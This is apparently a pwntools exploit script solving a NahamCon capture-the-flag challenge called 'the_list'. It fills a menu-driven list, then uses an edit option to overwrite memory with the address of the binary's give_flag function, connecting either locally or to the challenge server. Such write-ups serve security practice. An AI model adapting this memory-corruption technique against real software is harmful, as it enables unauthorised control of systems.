from pwn import *

e = ELF("./the_list")

context.binary = e.path

is_remote = "--remote" in sys.argv
def debug():
  if not is_remote:
    gdb.attach(p)

if is_remote:
  p = remote("challenge.nahamcon.com", 31980)
else:
  p = process(e.path)
  #, env={"LD_PRELOAD": libc.path})


p.sendlineafter("name:", "1")
for i in range(0x240 / 0x20):
  p.sendlineafter(">", "2")
  p.sendlineafter("name:", "AAAAAA" + p64(i))

p.sendlineafter(">", "4")
p.sendlineafter("?", "19")
p.sendlineafter("?", "A" * 8 + p64(e.symbols["give_flag"]))

debug()

p.interactive()
